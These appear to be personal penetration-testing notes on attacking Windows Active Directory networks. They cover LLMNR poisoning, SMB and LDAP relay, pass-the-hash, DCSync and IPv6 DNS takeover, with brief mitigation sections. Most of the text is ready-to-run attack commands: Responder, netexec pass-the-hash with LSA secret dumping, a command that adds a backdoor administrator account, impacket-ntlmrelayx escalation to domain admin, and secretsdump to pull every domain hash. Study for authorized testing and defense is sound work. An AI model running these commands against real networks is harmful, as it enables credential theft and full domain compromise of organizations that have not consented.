#LLMNR Posioning - (LLMNR/NBTNS/MDNS) -capture hashes and crack  (Responder)(john,hashcat) --As much you want (domain) 
#SMB Relay - NTLM crack(account access), smb share folder(files access), smb shares access(system access) (Responder,smbrelayx,crackmapsec-ntlmralyx)(john,hashcat)(smbclient,smbmap)(nc)

SMB Relay - Vulnerbality 
SMBv1, SMBv1.1 

Authentication - 
Smb signing enabled but not required (*)
smb disabled 

Methods
crackmapexec smb submnet(IPs-) file-Ips
nmap --script smb-security-mode IPs


Pass the hash - Local Admin hash - crack- domain access/login(SAM hashes), Pass - lateral movement (Responder,crackmapsec-ntlmralyx)

#Pass The Hash Attack 
netexec smb IP -u Administrator -H HASH --localauth 
netexec smb IP -u Administrator -H HASH --localauth --lsa 

	--lsa:
	passwords that are stored in the windows history in a clear text. 

	similarly we can pass the hash in the network using Subnet. 

netexec smb SUBNETIP -u Administrator -H HASH --localauth

we can also add the particular user in the domain using the commands 

netexec smb IP -u Administrator -H Hashes -x 'net user pentest Pentest@123 && net localgroup Administrators pentest /add' 

	to check if the system has the EDR; use the tool smbclient(impacket-smbclient) as localadministrator; rdp into the system	(ProgramFiles/system32)(use the tool magnet capture 	to dump ram and user the tool votality(forensics tool to ananlys the ram dump))
	 


What if the SMB signing is enabled in the network-- use this traffic to relay it to the LDAP protocol (SMB -> HTTP -> LDAP/LDAPS)
Cross Protocol Relay 



#LLMNR is a protocol, NTLM is a hash


#LDAP Relay attack -- (unauthorized access to domain gets the control of Domain controller)
Responder - we look for the HTTP responses, switch to the LDAP attack run the impacket, target the ldap services running on the ldap services and perform the services which are present in the domain. 

responder -I eth0 
disable the SMB,HTTP server from the config file 

impacket-ntlmrelayx -t ldap://DCIP --add-computer 
	#simulate the scenario now, access anything from the browse from the any user;browser anything which is not valid 

	responder will poision it, it will authenticate it and target the domain controller and will create a user and gives a clear text credentials (you can identify the domain user by "$") it will also create all domain informs dump so you can access the HTML File.

	Let's suppose we can a domain admin's user ldap response, we can create the user same as domain admin 
	using this user we can use the blound hound and do the dcsycn privilegdes 

	okay now we have created/add a user escalate the user 

impacket-ntlmrelayx -t ldap://DCIP --escalate-user USER$

#DCSync Attack
impacket-secretsdump domainname/'username':'password'@DCIP 

once you get the hash of the domain controller you verify by 

netexec smb DCIP -u Administrator -H HASH (Pwn3d!).

#Mitigations
Enable LDAP Signing and Channel Binding on DCs


#IPv6 DNS Takeover attack 

whenever the windows system starts it aoutmatically search for the wpad server for proxy server IP in the network which it can have access to the internet, if no wpad server present in the network it automatically interpret that there is no proxy server and directly connect to the internet. Since the system is in the network machine are behind the proxy server. 

Main attack is we spoof the DNS and give a fakewpad server address and IPs to the machine; so whenever the machine access anything over internet it will ask for authentication and onces the credentials are entered.  We will get those systems Net-NTLM hashes or the Sam hashes. Pass the hash or do the same process as LDAP relay attack and add the user using this credentials and Escalate it to domain admin. 

Run the tool mitm6 
python mitm6.py -d domainname 

impacket-ntlmrelayx -t ldap://DCIP --add-computer -wh fakewap.domain.name
we will get the user created with the credentials in plain text 

impacket-ntlmrelayx -t ldap://DCIP --escalate-user USER$ -wh fakewap.domain.name 
once the user is excalated to domain admin dump the secrets

impacket-secretsdump domain/'USER$':'PASSWORD'@DCIP 
dump every users hashes in the domain and get the access using netexec(like we did it in the PASS the HASh)


netexec smb DCIP -u Administrator -H HASH (Pwn3d!).




##Main difference between the ldap relay attack and Iv6 attack

Ldap relay attack - we wait for the users for wrong access over the internet 
IPv6 - we purposely make them authenticate over the internet 
also we exploit the misconfiguration present in the IPv6 
IPv6 is by default enabled. 

#Mitigations

Enable the LDAP signing, 
Disable the IPv6 if not in used 
Disable the wpad service if the proxy server not in placed.
